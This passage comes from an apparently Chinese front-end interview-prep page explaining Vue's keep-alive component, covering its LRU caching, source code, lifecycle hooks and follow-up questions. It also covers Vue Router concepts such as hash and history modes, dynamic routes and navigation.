<code>activated</code>，当组件被移除时，触发钩子函数 <code>deactivated</code></li>\\n<li><code>keep-alive</code> 的中还运用了 <code>LRU</code>(最近最少使用) 算法，选择最近最久未使用的组件予以淘汰</li>\\n</ul>\\n<blockquote>\\n<ul>\\n<li><code>&lt;keep-alive&gt;&lt;/keep-alive&gt;</code> 包裹动态组件时，会缓存不活动的组件实例,主要用于保留组件状态或避免重新渲染</li>\\n<li>比如有一个列表和一个详情，那么用户就会经常执行打开详情=&gt;返回列表=&gt;打开详情…这样的话列表和详情都是一个频率很高的页面，那么就可以对列表组件使用<code>&lt;keep-alive&gt;&lt;/keep-alive&gt;</code>进行缓存，这样用户每次返回列表的时候，都能从缓存中快速渲染，而不是重新渲染</li>\\n</ul>\\n</blockquote>\\n<p><strong>关于keep-alive的基本用法</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;keep-alive&gt;\\n  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;\\n&lt;/keep-alive&gt;\\n</code></pre>\\n<p>使用<code>includes</code>和<code>exclude</code>：</p>\\n<pre class=\\"language-html\\"><code>&lt;keep-alive include=&quot;a,b&quot;&gt;\\n  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;\\n&lt;/keep-alive&gt;\\n\\n&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;\\n&lt;keep-alive :include=&quot;/a|b/&quot;&gt;\\n  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;\\n&lt;/keep-alive&gt;\\n\\n&lt;!-- 数组 (使用 `v-bind`) --&gt;\\n&lt;keep-alive :include=&quot;[&#39;a&#39;, &#39;b&#39;]&quot;&gt;\\n  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;\\n&lt;/keep-alive&gt;\\n</code></pre>\\n<p>匹配首先检查组件自身的 <code>name</code> 选项，如果 <code>name</code> 选项不可用，则匹配它的局部注册名称 (父组件 <code>components</code> 选项的键值)，匿名组件不能被匹配</p>\\n<p>设置了 <code>keep-alive</code> 缓存的组件，会多出两个生命周期钩子（<code>activated</code>与<code>deactivated</code>）：</p>\\n<ul>\\n<li>首次进入组件时：<code>beforeRouteEnter</code> &gt; <code>beforeCreate</code> &gt; <code>created</code>&gt; <code>mounted</code> &gt; <code>activated</code> &gt; ... ... &gt; <code>beforeRouteLeave</code> &gt; <code>deactivated</code></li>\\n<li>再次进入组件时：<code>beforeRouteEnter</code> &gt;<code>activated</code> &gt; ... ... &gt; <code>beforeRouteLeave</code> &gt; <code>deactivated</code></li>\\n</ul>\\n<p><strong>使用场景</strong></p>\\n<p>使用原则：当我们在某些场景下不需要让页面重新加载时我们可以使用<code>keepalive</code></p>\\n<p>举个栗子:</p>\\n<p>当我们从<code>首页</code>–&gt;<code>列表页</code>–&gt;<code>商详页</code>–&gt;<code>再返回</code>，这时候列表页应该是需要<code>keep-alive</code></p>\\n<p>从<code>首页</code>–&gt;<code>列表页</code>–&gt;<code>商详页</code>–&gt;<code>返回到列表页(需要缓存)</code>–&gt;<code>返回到首页(需要缓存)</code>–&gt;<code>再次进入列表页(不需要缓存)</code>，这时候可以按需来控制页面的<code>keep-alive</code></p>\\n<p>在路由中设置<code>keepAlive</code>属性判断是否需要缓存</p>\\n<pre class=\\"language-js\\"><code>{\\n  path: &#39;list&#39;,\\n  name: &#39;itemList&#39;, // 列表页\\n  component (resolve) {\\n    require([&#39;@/pages/item/list&#39;], resolve)\\n },\\n meta: {\\n  keepAlive: true,\\n  title: &#39;列表页&#39;\\n }\\n}\\n</code></pre>\\n<p>使用<code>&lt;keep-alive&gt;</code></p>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot; class=&#39;wrapper&#39;&gt;\\n    &lt;keep-alive&gt;\\n        &lt;!-- 需要缓存的视图组件 --&gt; \\n        &lt;router-view v-if=&quot;$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;\\n     &lt;/keep-alive&gt;\\n      &lt;!-- 不需要缓存的视图组件 --&gt;\\n     &lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p><strong>思考题：缓存后如何获取数据</strong></p>\\n<p>解决方案可以有以下两种：</p>\\n<ul>\\n<li><code>beforeRouteEnter</code>：每次组件渲染的时候，都会执行<code>beforeRouteEnter</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>beforeRouteEnter(to, from, next){\\n    next(vm=&gt;{\\n        console.log(vm)\\n        // 每次进入路由执行\\n        vm.getData()  // 获取数据\\n    })\\n},\\n</code></pre>\\n<ul>\\n<li><code>actived</code>：在<code>keep-alive</code>缓存的组件被激活的时候，都会执行<code>actived</code>钩子</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// 注意：服务器端渲染期间avtived不被调用\\nactivated(){\\n  this.getData() // 获取数据\\n},\\n</code></pre>\\n<p><strong>扩展补充：LRU 算法是什么？</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/beabc92317439472.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p><code>LRU</code> 的核心思想是如果数据最近被访问过，那么将来被访问的几率也更高，所以我们将命中缓存的组件 <code>key</code> 重新插入到 <code>this.keys</code> 的尾部，这样一来，<code>this.keys</code> 中越往头部的数据即将来被访问几率越低，所以当缓存数量达到最大值时，我们就删除将来被访问几率最低的数据，即 <code>this.keys</code> 中第一个缓存的组件</p>\\n</blockquote>\\n<p><strong>相关代码</strong></p>\\n<p><code>keep-alive</code>是<code>vue</code>中内置的一个组件</p>\\n<p>源码位置：<code>src/core/components/keep-alive.js</code></p>\\n<pre class=\\"language-js\\"><code>export default {\\n  name: &quot;keep-alive&quot;,\\n  abstract: true, //抽象组件\\n\\n  props: {\\n    include: patternTypes, //要缓存的组件\\n    exclude: patternTypes, //要排除的组件\\n    max: [String, Number], //最大缓存数\\n  },\\n\\n  created() {\\n    this.cache = Object.create(null); //缓存对象  {a:vNode,b:vNode}\\n    this.keys = []; //缓存组件的key集合 [a,b]\\n  },\\n\\n  destroyed() {\\n    for (const key in this.cache) {\\n      pruneCacheEntry(this.cache, key, this.keys);\\n    }\\n  },\\n\\n  mounted() {\\n    //动态监听include  exclude\\n    this.$watch(&quot;include&quot;, (val) =&gt; {\\n      pruneCache(this, (name) =&gt; matches(val, name));\\n    });\\n    this.$watch(&quot;exclude&quot;, (val) =&gt; {\\n      pruneCache(this, (name) =&gt; !matches(val, name));\\n    });\\n  },\\n\\n  render() {\\n    const slot = this.$slots.default; //获取包裹的插槽默认值 获取默认插槽中的第一个组件节点\\n    const vnode: VNode = getFirstComponentChild(slot); //获取第一个子组件\\n    // 获取该组件节点的componentOptions\\n    const componentOptions: ?VNodeComponentOptions =\\n      vnode &amp;&amp; vnode.componentOptions;\\n    if (componentOptions) {\\n      // 获取该组件节点的名称，优先获取组件的name字段，如果name不存在则获取组件的tag\\n      const name: ?string = getComponentName(componentOptions);\\n      const { include, exclude } = this;\\n      // 不走缓存 如果name不在inlcude中或者存在于exlude中则表示不缓存，直接返回vnode\\n      if (\\n        // not included  不包含\\n        (include &amp;&amp; (!name || !matches(include, name))) ||\\n        // excluded  排除里面\\n        (exclude &amp;&amp; name &amp;&amp; matches(exclude, name))\\n      ) {\\n        //返回虚拟节点\\n        return vnode;\\n      }\\n\\n      const { cache, keys } = this;\\n      // 获取组件的key值\\n      const key: ?string =\\n        vnode.key == null\\n          ? // same constructor may get registered as different local components\\n            // so cid alone is not enough (#3269)\\n            componentOptions.Ctor.cid +\\n            (componentOptions.tag ? `::${componentOptions.tag}` : &quot;&quot;)\\n          : vnode.key;\\n      // 拿到key值后去this.cache对象中去寻找是否有该值，如果有则表示该组件有缓存，即命中缓存\\n      if (cache[key]) {\\n        //通过key 找到缓存 获取实例\\n        vnode.componentInstance = cache[key].componentInstance;\\n        // make current key freshest\\n        remove(keys, key); //通过LRU算法把数组里面的key删掉\\n        keys.push(key); //把它放在数组末尾\\n      } else {\\n        cache[key] = vnode; //没找到就换存下来\\n        keys.push(key); //把它放在数组末尾\\n        // prune oldest entry  //如果超过最大值就把数组第0项删掉\\n        if (this.max &amp;&amp; keys.length &gt; parseInt(this.max)) {\\n          pruneCacheEntry(cache, keys[0], keys, this._vnode);\\n        }\\n      }\\n\\n      vnode.data.keepAlive = true; //标记虚拟节点已经被缓存\\n    }\\n    // 返回虚拟节点\\n    return vnode || (slot &amp;&amp; slot[0]);\\n  },\\n};\\n</code></pre>\\n<p>可以看到该组件没有<code>template</code>，而是用了<code>render</code>，在组件渲染的时候会自动执行<code>render</code>函数</p>\\n<p><code>this.cache</code>是一个对象，用来存储需要缓存的组件，它将以如下形式存储：</p>\\n<pre class=\\"language-js\\"><code>this.cache = {\\n  &#39;key1&#39;:&#39;组件1&#39;,\\n  &#39;key2&#39;:&#39;组件2&#39;,\\n  // ...\\n}\\n</code></pre>\\n<p>在组件销毁的时候执行<code>pruneCacheEntry</code>函数</p>\\n<pre class=\\"language-js\\"><code>function pruneCacheEntry (\\n  cache: VNodeCache,\\n  key: string,\\n  keys: Array&lt;string&gt;,\\n  current?: VNode\\n) {\\n  const cached = cache[key]\\n  /* 判断当前没有处于被渲染状态的组件，将其销毁*/\\n  if (cached &amp;&amp; (!current || cached.tag !== current.tag)) {\\n    cached.componentInstance.$destroy()\\n  }\\n  cache[key] = null\\n  remove(keys, key)\\n}\\n</code></pre>\\n<p>在<code>mounted</code>钩子函数中观测 <code>include</code> 和 <code>exclude</code> 的变化，如下：</p>\\n<pre class=\\"language-js\\"><code>mounted () {\\n  this.$watch(&#39;include&#39;, val =&gt; {\\n      pruneCache(this, name =&gt; matches(val, name))\\n  })\\n  this.$watch(&#39;exclude&#39;, val =&gt; {\\n      pruneCache(this, name =&gt; !matches(val, name))\\n  })\\n}\\n</code></pre>\\n<p>如果<code>include</code> 或<code>exclude</code> 发生了变化，即表示定义需要缓存的组件的规则或者不需要缓存的组件的规则发生了变化，那么就执行<code>pruneCache</code>函数，函数如下</p>\\n<pre class=\\"language-js\\"><code>function pruneCache (keepAliveInstance, filter) {\\n  const { cache, keys, _vnode } = keepAliveInstance\\n  for (const key in cache) {\\n    const cachedNode = cache[key]\\n    if (cachedNode) {\\n      const name = getComponentName(cachedNode.componentOptions)\\n      if (name &amp;&amp; !filter(name)) {\\n        pruneCacheEntry(cache, key, keys, _vnode)\\n      }\\n    }\\n  }\\n}\\n</code></pre>\\n<p>在该函数内对<code>this.cache</code>对象进行遍历，取出每一项的<code>name</code>值，用其与新的缓存规则进行匹配，如果匹配不上，则表示在新的缓存规则下该组件已经不需要被缓存，则调用<code>pruneCacheEntry</code>函数将其从<code>this.cache</code>对象剔除即可</p>\\n<p>关于<code>keep-alive</code>的最强大缓存功能是在<code>render</code>函数中实现</p>\\n<p>首先获取组件的<code>key</code>值：</p>\\n<pre class=\\"language-go\\"><code>const key = vnode.key == null? \\ncomponentOptions.Ctor.cid + (componentOptions.tag ? `::${componentOptions.tag}` : &#39;&#39;)\\n: vnode.key\\n</code></pre>\\n<p>拿到<code>key</code>值后去<code>this.cache</code>对象中去寻找是否有该值，如果有则表示该组件有缓存，即命中缓存，如下：</p>\\n<pre class=\\"language-go\\"><code>/* 如果命中缓存，则直接从缓存中拿 vnode 的组件实例 */\\nif (cache[key]) {\\n    vnode.componentInstance = cache[key].componentInstance\\n    /* 调整该组件key的顺序，将其从原来的地方删掉并重新放在最后一个 */\\n    remove(keys, key)\\n    keys.push(key)\\n} \\n</code></pre>\\n<p>直接从缓存中拿 <code>vnode</code> 的组件实例，此时重新调整该组件<code>key</code>的顺序，将其从原来的地方删掉并重新放在<code>this.keys</code>中最后一个</p>\\n<p><code>this.cache</code>对象中没有该<code>key</code>值的情况，如下：</p>\\n<pre class=\\"language-go\\"><code>/* 如果没有命中缓存，则将其设置进缓存 */\\nelse {\\n    cache[key] = vnode\\n    keys.push(key)\\n    /* 如果配置了max并且缓存的长度超过了this.max，则从缓存中删除第一个 */\\n    if (this.max &amp;&amp; keys.length &gt; parseInt(this.max)) {\\n        pruneCacheEntry(cache, keys[0], keys, this._vnode)\\n    }\\n}\\n</code></pre>\\n<p>表明该组件还没有被缓存过，则以该组件的<code>key</code>为键，组件<code>vnode</code>为值，将其存入<code>this.cache</code>中，并且把<code>key</code>存入<code>this.keys</code>中</p>\\n<p>此时再判断<code>this.keys</code>中缓存组件的数量是否超过了设置的最大缓存数量值<code>this.max</code>，如果超过了，则把第一个缓存组件删掉</p>\\n<h3 id=\\"怎么缓存当前的组件-缓存后怎么更新\\"><a class=\\"header-anchor\\" href=\\"#怎么缓存当前的组件-缓存后怎么更新\\">#</a> 怎么缓存当前的组件？缓存后怎么更新</h3>\\n<p>缓存组件使用<code>keep-alive</code>组件，这是一个非常常见且有用的优化手段，<code>vue3</code>中<code>keep-alive</code>有比较大的更新，能说的点比较多</p>\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>缓存用<code>keep-alive</code>，它的作用与用法</li>\\n<li>使用细节，例如缓存指定/排除、结合<code>router</code>和<code>transition</code></li>\\n<li>组件缓存后更新可以利用<code>activated</code>或者<code>beforeRouteEnter</code></li>\\n<li>原理阐述</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>开发中缓存组件使用<code>keep-alive</code>组件，<code>keep-alive</code>是<code>vue</code>内置组件，<code>keep-alive</code>包裹动态组件<code>component</code>时，会缓存不活动的组件实例，而不是销毁它们，这样在组件切换过程中将状态保留在内存中，防止重复渲染<code>DOM</code></li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;keep-alive&gt;\\n  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;\\n&lt;/keep-alive&gt;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>结合属性<code>include</code>和<code>exclude</code>可以明确指定缓存哪些组件或排除缓存指定组件。<code>vue3</code>中结合<code>vue-router</code>时变化较大，之前是<code>keep-alive</code>包裹<code>router-view</code>，现在需要反过来用<code>router-view</code>包裹<code>keep-alive</code></li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;router-view v-slot=&quot;{ Component }&quot;&gt;\\n  &lt;keep-alive&gt;\\n    &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt;\\n  &lt;/keep-alive&gt;\\n&lt;/router-view&gt;\\n</code></pre>\\n<ol start=\\"3\\">\\n<li>缓存后如果要获取数据，解决方案可以有以下两种</li>\\n</ol>\\n<ul>\\n<li><code>beforeRouteEnter</code>：在有<code>vue-router的</code>项目，每次进入路由的时候，都会执行<code>beforeRouteEnter</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>beforeRouteEnter(to, from, next){\\n  next(vm=&gt;{\\n    console.log(vm)\\n    // 每次进入路由执行\\n    vm.getData()  // 获取数据\\n  })\\n},\\n</code></pre>\\n<ul>\\n<li><code>actived</code>：在<code>keep-alive</code>缓存的组件被激活的时候，都会执行<code>actived</code>钩子</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>activated(){\\n\\tthis.getData() // 获取数据\\n},\\n</code></pre>\\n<ol start=\\"4\\">\\n<li><code>keep-alive</code>是一个通用组件，它内部定义了一个<code>map</code>，缓存创建过的组件实例，它返回的渲染函数内部会查找内嵌的<code>component</code>组件对应组件的<code>vnode</code>，如果该组件在<code>map</code>中存在就直接返回它。由于<code>component</code>的<code>is</code>属性是个响应式数据，因此只要它变化，<code>keep-alive</code>的<code>render</code>函数就会重新执行</li>\\n</ol>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品列表切到详情再返回，团队只把列表 <code>DOM</code> 隐藏起来，认为这就等同于 <code>keep-alive</code>，这个判断哪里不成立？</strong></p>\\n<p>隐藏 <code>DOM</code> 只改变可见性，并不等于由 <code>keep-alive</code> 缓存动态组件实例和状态。<code>keep-alive</code> 在组件切换时保留非活动实例，命中缓存后复用对应 <code>VNode</code> 和实例；单纯隐藏还可能让多个页面逻辑持续运行，也没有统一的缓存筛选机制。</p>\\n</li>\\n<li>\\n<p><strong>管理后台希望返回列表时保留筛选条件和滚动状态，<code>Vue 3</code> 路由出口应该怎样包裹 <code>keep-alive</code>？</strong></p>\\n<p>应使用 <code>router-view</code> 的作用域插槽取得 <code>Component</code>，再让 <code>&lt;keep-alive&gt;</code> 包裹 <code>&lt;component :is=&quot;Component&quot;&gt;</code>。随后结合 <code>include</code> 或 <code>exclude</code> 明确缓存范围；组件名称与筛选规则不匹配时，页面仍会被重新创建，不能只看模板结构判断缓存是否生效。</p>\\n</li>\\n<li>\\n<p><strong>新闻详情页被缓存后，每次从相关推荐进入都要重新获取当前文章，你会把请求放在 <code>mounted</code>、<code>activated</code> 还是路由守卫里？</strong></p>\\n<p>缓存实例重新进入时不会再次执行 <code>mounted</code>，可在 <code>activated</code> 中依据当前参数刷新数据；路由项目也可用 <code>beforeRouteEnter</code> 在每次进入时调用实例方法。若同一实例存在频繁激活，请求前还应判断数据是否过期，否则缓存虽然保住了组件，却带来重复取数。</p>\\n</li>\\n<li>\\n<p><strong>页面已经放进 <code>keep-alive</code>，但返回时筛选项仍被重置，你会按什么顺序排查？</strong></p>\\n<p>先确认目标组件确实位于 <code>&lt;keep-alive&gt;</code> 包裹的动态组件位置，再检查 <code>include</code>、<code>exclude</code> 是否命中正确组件名。随后观察路由切换时实例是否被销毁，以及 <code>activated</code> 中是否主动重置了状态；缓存只能保留实例，业务代码仍可覆盖其中的数据。</p>\\n</li>\\n<li>\\n<p><strong>运营后台有几十个路由，架构师要求全部缓存以避免重复渲染，你会接受这个方案吗？</strong></p>\\n<p>不应默认缓存全部页面，应通过 <code>include</code> 或 <code>exclude</code> 只保留切换后确实需要延续状态的组件。<code>keep-alive</code> 将不活动实例保存在内存中，缓存范围越大，保留的状态和资源越多；对进入即需全量刷新的页面，缓存收益也会被刷新逻辑抵消。</p>\\n</li>\\n<li>\\n<p><strong>动态组件的 <code>:is</code> 从图表切到表格再切回来时，为什么旧图表状态还能恢复？</strong></p>\\n<p><code>:is</code> 是响应式数据，变化会触发 <code>keep-alive</code> 的渲染逻辑重新执行，并按组件对应的缓存记录查找实例。命中后直接复用缓存的 <code>VNode</code> 与组件实例，而不是重新创建；如果组件被排除出缓存，恢复状态的前提就不再成立。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_26-vue路由相关\\"><a class=\\"header-anchor\\" href=\\"#_26-vue路由相关\\">#</a> 26 Vue路由相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>两种模式：<code>hash</code>（<code>#</code> 后面不发给服务器，兼容性好但 <code>URL</code> 难看、不利 <code>SEO</code>）和 <code>history</code>（靠 <code>pushState</code>，需要服务端配合）</li>\\n<li><code>history</code> 模式必须配 <code>Nginx</code> 的 <code>try_files $uri $uri/ /index.html</code>，否则刷新或直接访问子路由会 404</li>\\n<li>导航守卫三级：全局（<code>beforeEach</code>/<code>afterEach</code>）、路由独享（<code>beforeEnter</code>）、组件内（<code>beforeRouteEnter</code>/<code>Update</code>/<code>Leave</code>）</li>\\n<li>动态路由（<code>/detail/:id</code>）参数变化时<strong>组件被复用</strong>，<code>created</code>/<code>mounted</code> 不会重新执行，要 <code>watch</code> 路由或给 <code>router-view</code> 加 <code>key</code></li>\\n<li>权限控制在 <code>beforeEach</code> 里做，动态路由用 <code>addRoute</code> 注册；注意&quot;未匹配路由&quot;要放在动态添加之后</li>\\n</ul>\\n<p><strong><code>Vue Router</code> 负责在不整页刷新的情况下切换地址和组件，常见浏览器模式是 <code>hash</code> 与 <code>history</code>。</strong> <code>hash</code> 依赖 <code>#</code> 和 <code>hashchange</code>，兼容性好且刷新不需服务端处理；<code>history</code> 使用 <code>pushState</code>，地址更自然，但服务端必须把前端路由回退到入口页面。导航控制可放在全局、路由独享或组件内守卫中。动态参数变化时组件可能被复用，<code>created</code> 和 <code>mounted</code> 不会重跑，可监听 <code>$route</code>、使用 <code>beforeRouteUpdate</code>，或给 <code>router-view</code> 设置 <code>key</code>。</p>\\n</section>\\n<h3 id=\\"vue-router基本使用\\"><a class=\\"header-anchor\\" href=\\"#vue-router基本使用\\">#</a> Vue-router基本使用</h3>\\n<p><strong>mode</strong></p>\\n<ul>\\n<li><code>hash</code></li>\\n<li><code>history</code></li>\\n</ul>\\n<p><strong>跳转</strong></p>\\n<ul>\\n<li>编程式（js跳转）<code>this.$router.push(\'/\')</code></li>\\n<li>声明式（标签跳转） <code>&lt;router-link to=&quot;&quot;&gt;&lt;/router-link&gt;</code></li>\\n</ul>\\n<p><strong>vue路由传参数</strong></p>\\n<ul>\\n<li>使用<code>query</code>方法传入的参数使用<code>this.$route.query</code>接受</li>\\n<li>使用<code>params</code>方式传入的参数使用<code>this.$route.params</code>接受</li>\\n</ul>\\n<p><strong>占位</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;router-view&gt;&lt;/router-view&gt;\\n</code></pre>\\n<h3 id=\\"vue-router-动态路由是什么\\"><a class=\\"header-anchor\\" href=\\"#vue-router-动态路由是什么\\">#</a> vue-router 动态路由是什么</h3>\\n<blockquote>\\n<p>我们经常需要把某种模式匹配到的所有路由，全都映射到同个组件。例如，我们有一个 <code>User</code> 组件，对于所有 <code>ID</code> 各不相同的用户，都要使用这个组件来渲染。那么，我们可以在 <code>vue-router</code> 的路由路径中使用“动态路径参数”(dynamic segment) 来达到这个效果</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>const User = {\\n  template: &quot;&lt;div&gt;User&lt;/div&gt;&quot;,\\n};\\n\\nconst router = new VueRouter({\\n  routes: [\\n    // 动态路径参数 以冒号开头\\n    { path: &quot;/user/:id&quot;, component: User },\\n  ],\\n});\\n</code></pre>\\n<p>问题: <code>vue-router</code> 组件复用导致路由参数失效怎么办？</p>\\n<p>解决方法：</p>\\n<ol>\\n<li>通过 <code>watch</code> 监听路由参数再发请求</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>watch: { //通过watch来监听路由变化\\n &quot;$route&quot;: function(){\\n  this.getData(this.$route.params.xxx);\\n }\\n}\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>用 <code>:key</code> 来阻止“复用”</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;router-view :key=&quot;$route.fullPath&quot; /&gt;\\n</code></pre>\\n<div class=\\"tip\\">\\n<ol>\\n<li>很多时候，我们需要将给定匹配模式的路由映射到同一个组件，这种情况就需要定义动态路由</li>\\n<li>例如，我们可能有一个 <code>User</code> 组件，它应该对所有用户进行渲染，但用户 <code>ID</code> 不同。在 <code>Vue Router</code>中，我们可以在路径中使用一个动态字段来实现，例如：<code>{ path: \'/users/:id\', component: User }</code>，其中<code>:id</code>就是路径参数</li>\\n<li>路径参数 用冒号 <code>:</code> 表示。当一个路由被匹配时，它的 <code>params</code> 的值将在每个组件中以 <code>this.$route.params</code> 的形式暴露出来。</li>\\n<li>参数还可以有多个，例如/<code>users/:username/posts/:postId</code>；除了 <code>$route.params</code> 之外，<code>$route</code> 对象还公开了其他有用的信息，如 <code>$route.query</code>、<code>$route.hash</code> 等</li>\\n</ol>\\n</div>\\n<h3 id=\\"router-link和router-view是如何起作用的\\"><a class=\\"header-anchor\\" href=\\"#router-link和router-view是如何起作用的\\">#</a> router-link和router-view是如何起作用的</h3>\\n<p><strong>分析</strong></p>\\n<p><code>vue-router</code>中两个重要组件<code>router-link</code>和<code>router-view</code>，分别起到导航作用和内容渲染作用，但是回答如何生效还真有一定难度</p>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>vue-router</code>中两个重要组件<code>router-link</code>和<code>router-view</code>，分别起到路由导航作用和组件内容渲染作用</li>\\n<li>使用中<code>router-link</code>默认生成一个<code>a</code>标签，设置<code>to</code>属性定义跳转<code>path</code>。实际上也可以通过<code>custom</code>和插槽自定义最终的展现形式。<code>router-view</code>是要显示组件的占位组件，可以嵌套，对应路由配置的嵌套关系，配合<code>name</code>可以显示具名组件，起到更强的布局作用。</li>\\n<li><code>router-link</code>组件内部根据<code>custom</code>属性判断如何渲染最终生成节点，内部提供导航方法<code>navigate</code>，用户点击之后实际调用的是该方法，此方法最终会修改响应式的路由变量，然后重新去<code>routes</code>匹配出数组结果，<code>router-view</code>则根据其所处深度<code>deep</code>在匹配数组结果中找到对应的路由并获取组件，最终将其渲染出来。</li>\\n</ol>\\n<h3 id=\\"vue-router-除了-router-link-怎么实现跳转\\"><a class=\\"header-anchor\\" href=\\"#vue-router-除了-router-link-怎么实现跳转\\">#</a> Vue-router 除了 router-link 怎么实现跳转</h3>\\n<p>声明式导航</p>\\n<pre class=\\"language-text\\"><code>&lt;router-link to=&quot;/about&quot;&gt;Go to About&lt;/router-link&gt;\\n</code></pre>\\n<p>编程式导航</p>\\n<pre class=\\"language-js\\"><code>// literal string path\\nrouter.push(&#39;/users/1&#39;)\\n​\\n// object with path\\nrouter.push({ path: &#39;/users/1&#39; })\\n​\\n// named route with params to let the router build the url\\nrouter.push({ name: &#39;user&#39;, params: { username: &#39;test&#39; } })\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ul>\\n<li><code>vue-router</code>导航有两种方式：声明式导航和编程方式导航</li>\\n<li>声明式导航方式使用<code>router-link</code>组件，添加<code>to</code>属性导航；编程方式导航更加灵活，可传递调用<code>router.push()</code>，并传递<code>path</code>字符串或者<code>RouteLocationRaw</code>对象，指定<code>path</code>、<code>name</code>、<code>params</code>等信息</li>\\n<li>如果页面中简单表示跳转链接，使用<code>router-link</code>最快捷，会渲染一个a标签；如果页面是个复杂的内容，比如商品信息，可以添加点击事件，使用编程式导航</li>\\n<li>实际上内部两者调用的导航函数是一样的</li>\\n</ul>\\n<h3 id=\\"vue-router-路由模式有几种\\"><a class=\\"header-anchor\\" href=\\"#vue-router-路由模式有几种\\">#</a> Vue-router 路由模式有几种</h3>\\n<p><code>vue-router</code> 有 <code>3</code> 种路由模式：<code>hash</code>、<code>history</code>、<code>abstract</code>，对应的源码如下所示</p>\\n<pre class=\\"language-js\\"><code>switch (mode) {\\n    case &#39;history&#39;:\\n    this.history = new HTML5History(this, options.base)\\n\\tbreak\\n    case &#39;hash&#39;:\\n    this.history = new HashHistory(this, options.base, this.fallback)\\n\\t  break\\n    case &#39;abstract&#39;:\\n    this.history = new AbstractHistory(this, options.base)\\n\\t  break\\n  default:\\n    if (process.env.NODE_ENV !== &#39;production&#39;) {\\n      assert(false, `invalid mode: ${mode}`)\\n    }\\n}\\n</code></pre>\\n<p>其中，3 种路由模式的说明如下：</p>\\n<ul>\\n<li><code>hash</code>:  使用 <code>URL hash</code> 值来作路由，支持所有浏览器。 缺点：SEO不友好</li>\\n<li><code>history</code> :  依赖 <code>HTML5 History API</code> 和服务器配置。后端将所有前端路由都渲染同一页面，但不能是<code>404</code>页面。缺点：<code>IE8</code>不支持</li>\\n<li><code>abstract</code> :  支持所有 <code>JavaScript</code> 运行环境，如 <code>Node.js</code> 服务器端。如果发现没有浏览器的 <code>API</code>，路由会自动强制进入这个模式。缺点：没有<code>URL</code>，只对单机有效。前面两种都是把路径存到<code>URL</code>上面。<code>memory</code>模式不放在<code>URL</code>里面，前端一般放在<code>localstorage</code>里面。</li>\\n</ul>\\n<blockquote>\\n<p>注意：<code>v4</code>之前叫做<code>abstract history</code>，之后叫做<code>MemoryHistory</code></p>\\n</blockquote>\\n<h3 id=\\"vue路由hash模式和history模式\\"><a class=\\"header-anchor\\" href=\\"#vue路由hash模式和history模式\\">#</a> Vue路由hash模式和history模式</h3>\\n<p><strong>1. <code>hash</code>模式</strong></p>\\n<p>早期的前端路由的实现就是基于 <code>location.hash</code> 来实现的。其实现原理很简单，<code>location.hash</code> 的值就是 <code>URL</code>中 <code>#</code> 后面的内容。比如下面这个网站，它的 <code>location.hash</code> 的值为 <code>\'#search\'</code></p>\\n<pre class=\\"language-text\\"><code>https://interview.poetries.top#search\\n</code></pre>\\n<p><strong>hash 路由模式的实现主要是基于下面几个特性</strong></p>\\n<ul>\\n<li><code>URL</code> 中 <code>hash</code> 值只是客户端的一种状态，也就是说当向服务器端发出请求时，<code>hash</code> 部分不会被发送；</li>\\n<li><code>hash</code> 值的改变，都会在浏览器的访问历史中增加一个记录。因此我们能通过浏览器的回退、前进按钮控制 <code>hash</code> 的切换；</li>\\n<li>可以通过 <code>a</code> 标签，并设置 <code>href</code> 属性，当用户点击这个标签后，<code>URL</code> 的 <code>hash</code> 值会发生改变；或者使用 <code>JavaScript</code> 来对 <code>loaction.hash</code> 进行赋值，改变 <code>URL</code> 的 <code>hash</code> 值；</li>\\n<li>我们可以使用 <code>hashchange</code> 事件来监听 <code>hash</code> 值的变化，从而对页面进行跳转（渲染）</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>window.addEventListener(&quot;hashchange&quot;, funcRef, false);\\n</code></pre>\\n<p>每一次改变 <code>hash</code>（<code>window.location.hash</code>），都会在浏览器的访问历史中增加一个记录利用 <code>hash</code> 的以上特点，就可以来实现前端路由“更新视图但不重新请求页面”的功能了</p>\\n<p><strong>特点</strong>：兼容性好但是不美观</p>\\n<p><strong>2. <code>history</code>模式</strong></p>\\n<p><code>history</code>采用<code>HTML5</code>的新特性；且提供了两个新方法： <code>pushState()</code>， <code>replaceState()</code>可以对浏览器历史记录栈进行修改，以及<code>popState</code>事件的监听到状态变更</p>\\n<pre class=\\"language-js\\"><code>window.history.pushState(null, null, path);\\nwindow.history.replaceState(null, null, path);\\n</code></pre>\\n<p>这两个方法有个共同的特点：当调用他们修改浏览器历史记录栈后，虽然当前 <code>URL</code> 